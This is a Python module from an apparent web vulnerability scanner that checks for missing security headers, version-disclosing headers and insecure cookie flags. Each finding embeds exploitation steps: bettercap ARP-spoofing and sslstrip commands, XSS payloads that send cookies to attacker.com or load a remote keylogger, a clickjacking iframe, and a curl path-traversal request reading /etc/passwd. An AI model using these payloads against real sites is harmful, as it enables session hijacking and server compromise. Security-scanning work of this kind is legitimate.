from core.utils import make_request, print_finding, print_status, print_info

MODULE = "Headers"

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": "HIGH",
        "description": "HSTS not set - vulnerable to protocol downgrade and cookie hijacking",
        "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains",
        "exploitation": (
            "1. Set up a MITM proxy (e.g., Bettercap, mitmproxy) on the same network as the victim\n"
            "2. Intercept the victim's first HTTP request before it redirects to HTTPS\n"
            "3. Use sslstrip to downgrade HTTPS to HTTP: sslstrip -l 8080\n"
            "4. All traffic is now in plaintext  - capture cookies, credentials, and session tokens\n"
            "5. Tool: bettercap -iface eth0 -eval 'set arp.spoof.targets <victim_ip>; arp.spoof on; set net.sniff.local true; net.sniff on'"
        ),
    },
    "Content-Security-Policy": {
        "severity": "MEDIUM",
        "description": "CSP not set - vulnerable to XSS and data injection attacks",
        "recommendation": "Add: Content-Security-Policy: default-src 'self'",
        "exploitation": (
            "1. Find an XSS injection point (reflected or stored) on the site\n"
            "2. Without CSP, any injected script runs without restriction\n"
            "3. Inject: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n"
            "4. This exfiltrates all cookies to attacker's server\n"
            "5. Inject external scripts: <script src='https://attacker.com/keylogger.js'></script>\n"
            "6. Without CSP, the browser loads and executes the attacker's script"
        ),
    },
    "X-Content-Type-Options": {
        "severity": "MEDIUM",
        "description": "Missing header - browser may MIME-sniff responses",
        "recommendation": "Add: X-Content-Type-Options: nosniff",
        "exploitation": (
            "1. Upload a file with a harmless extension (e.g., .jpg) but with HTML/JS content inside\n"
            "2. Without nosniff, the browser may 'sniff' the content and render it as HTML\n"
            "3. Example: upload a .txt file containing <script>alert(document.cookie)</script>\n"
            "4. If the browser sniffs it as text/html, the script executes (stored XSS)\n"
            "5. This bypasses file-type upload restrictions"
        ),
    },
    "X-Frame-Options": {
        "severity": "MEDIUM",
        "description": "Missing header - vulnerable to clickjacking attacks",
        "recommendation": "Add: X-Frame-Options: DENY or SAMEORIGIN",
        "exploitation": (
            "1. Create a malicious HTML page that loads the target site in a hidden <iframe>\n"
            "2. Overlay invisible buttons on top of the iframe aligned with the target's real buttons\n"
            "3. Example: <iframe src='https://target.com/settings/delete-account' style='opacity:0'>\n"
            "4. When the victim clicks what they think is a harmless button, they actually click inside the iframe\n"
            "5. This can trick users into changing passwords, transferring funds, or deleting accounts\n"
            "6. Tool: Burp Suite Clickbandit automates clickjacking PoC creation"
        ),
    },
}

INSECURE_HEADERS = {
    "Server": {
        "description": "Server version disclosed  - helps attackers fingerprint the server",
        "exploitation": (
            "1. Note the server version from the header (e.g., Apache/2.4.49, nginx/1.18)\n"
            "2. Search for known CVEs: searchsploit apache 2.4.49 OR search exploit-db.com\n"
            "3. Example: Apache 2.4.49 has CVE-2021-41773 (path traversal + RCE)\n"
            "4. Use Metasploit: use exploit/multi/http/apache_normalize_path_rce\n"
            "5. Or manually: curl 'https://target.com/cgi-bin/.%%32%65/.%%32%65/etc/passwd'"
        ),
    },
    "X-Powered-By": {
        "description": "Technology stack disclosed  - helps attackers identify frameworks",
        "exploitation": (
            "1. Identify the framework version (e.g., Express, PHP/8.1, ASP.NET)\n"
            "2. Search for known vulnerabilities: searchsploit <framework> <version>\n"
            "3. Framework-specific attacks: PHP deserialization, Express prototype pollution\n"
            "4. Use framework-specific tools (e.g., WPScan for WordPress, Droopescan for Drupal)"
        ),
    },
    "X-AspNet-Version": {
        "description": "ASP.NET version disclosed",
        "exploitation": (
            "1. Identify the exact ASP.NET version\n"
            "2. Check for known CVEs at cvedetails.com for that version\n"
            "3. Test for ASP.NET-specific vulns: ViewState deserialization, padding oracle\n"
            "4. Tool: ysoserial.net for .NET deserialization exploits"
        ),
    },
    "X-AspNetMvc-Version": {
        "description": "ASP.NET MVC version disclosed",
        "exploitation": (
            "1. Identify MVC version and search for known exploits\n"
            "2. Test for model binding vulnerabilities and mass assignment\n"
            "3. Check for debug/error pages leaking stack traces"
        ),
    },
}


def _is_waf_challenge(resp):
    """Return True if the response is a WAF/bot challenge page, not real content."""
    if resp is None:
        return False
    # Cloudflare challenge indicators
    if resp.headers.get("Cf-Mitigated") == "challenge":
        return True
    if resp.status_code == 403 and "cloudflare" in resp.headers.get("Server", "").lower():
        return True
    # Generic WAF challenge: 403 with tiny body and no CSP
    if resp.status_code in (403, 429) and len(resp.text) < 2000:
        body = resp.text.lower()
        if any(x in body for x in ["just a moment", "checking your browser", "ddos-guard", "please wait"]):
            return True
    return False


def _get_best_response(target_url, crawl_data):
    """
    Try to get a real page response (not a WAF challenge).
    Strategy:
      1. Try the target URL
      2. If WAF challenge, try URLs from crawl_data (sitemap/recon pages)
      3. Return the best response and a flag indicating if it came from a real page
    """
    resp = make_request(target_url)

    if not _is_waf_challenge(resp):
        return resp, target_url, False  # (response, url_used, is_waf)

    print_info("WAF/Cloudflare challenge detected on target — trying alternate URLs for header analysis...")

    # Try crawled/recon pages to get a real origin response
    candidates = [u for u in crawl_data.get("urls", []) if u != target_url]
    for url in candidates[:10]:
        alt = make_request(url)
        if alt is not None and not _is_waf_challenge(alt):
            print_info(f"Got real response from: {url} (HTTP {alt.status_code})")
            return alt, url, False

    # Nothing bypassed WAF — fall back to the challenge response but flag it
    print_info("All responses are WAF-gated — headers checked from challenge page (may be incomplete)")
    return resp, target_url, True


def scan(target_url, crawl_data):
    print_status("Checking security headers...")
    findings = []

    resp, resp_url, is_waf = _get_best_response(target_url, crawl_data)
    if resp is None:
        return findings

    headers = resp.headers
    headers_lower = {k.lower() for k in headers}

    waf_note = " [NOTE: checked on WAF challenge page — verify manually on real page]" if is_waf else ""

    for header, info in SECURITY_HEADERS.items():
        if header.lower() not in headers_lower:
            finding = {
                "severity": info["severity"],
                "module": MODULE,
                "type": f"Missing Security Header: {header}",
                "url": resp_url,
                "parameter": "",
                "payload": "",
                "evidence": f"Header '{header}' not found in response{waf_note}",
                "description": info["description"],
                "recommendation": info["recommendation"],
                "exploitation": info["exploitation"],
            }
            findings.append(finding)
            print_finding(info["severity"], MODULE,
                          f"Missing: {header}",
                          url=resp_url,
                          detail=info["description"])

    for header, info in INSECURE_HEADERS.items():
        value = headers.get(header)
        if value:
            finding = {
                "severity": "LOW",
                "module": MODULE,
                "type": f"Information Disclosure: {header}",
                "url": resp_url,
                "parameter": "",
                "payload": "",
                "evidence": f"{header}: {value}",
                "description": info["description"],
                "recommendation": f"Remove or suppress the '{header}' header",
                "exploitation": info["exploitation"],
            }
            findings.append(finding)
            print_finding("LOW", MODULE,
                          f"Info disclosure: {header}: {value}",
                          url=resp_url,
                          detail=info["description"])

    # Check all Set-Cookie headers (handle multiple cookies correctly)
    raw_cookies = []
    try:
        # urllib3 HTTPHeaderDict supports getlist() for multi-value headers
        raw_cookies = resp.raw.headers.getlist("set-cookie")
    except AttributeError:
        try:
            raw_cookies = [v for k, v in resp.raw.headers.items() if k.lower() == "set-cookie"]
        except Exception:
            pass
    if not raw_cookies and "Set-Cookie" in headers:
        raw_cookies = [headers.get("Set-Cookie", "")]

    for cookie in raw_cookies:
        cookie_lower = cookie.lower()
        cookie_preview = cookie[:100]

        if "httponly" not in cookie_lower:
            findings.append({
                "severity": "MEDIUM",
                "module": MODULE,
                "type": "Cookie Missing HttpOnly Flag",
                "url": resp_url,
                "evidence": cookie_preview,
                "description": "Cookie accessible via JavaScript  - XSS can steal sessions",
                "exploitation": (
                    "1. Find any XSS vulnerability on the site (reflected or stored)\n"
                    "2. Inject: <script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>\n"
                    "3. Without HttpOnly, document.cookie returns all cookies including session tokens\n"
                    "4. Use the stolen session cookie to impersonate the victim\n"
                    "5. In browser DevTools: document.cookie = 'session=<stolen_value>'; then refresh"
                ),
            })
            print_finding("MEDIUM", MODULE, "Cookie missing HttpOnly flag", url=resp_url)

        if "secure" not in cookie_lower:
            findings.append({
                "severity": "MEDIUM",
                "module": MODULE,
                "type": "Cookie Missing Secure Flag",
                "url": resp_url,
                "evidence": cookie_preview,
                "description": "Cookie transmitted over HTTP  - vulnerable to interception",
                "exploitation": (
                    "1. Set up MITM on the victim's network (ARP spoofing with Bettercap or Ettercap)\n"
                    "2. Sniff HTTP traffic with Wireshark: filter 'http.cookie'\n"
                    "3. Without the Secure flag, cookies are sent over unencrypted HTTP requests\n"
                    "4. Capture the session cookie from the plaintext HTTP traffic\n"
                    "5. Use the cookie to hijack the victim's session"
                ),
            })
            print_finding("MEDIUM", MODULE, "Cookie missing Secure flag", url=resp_url)

    return findings
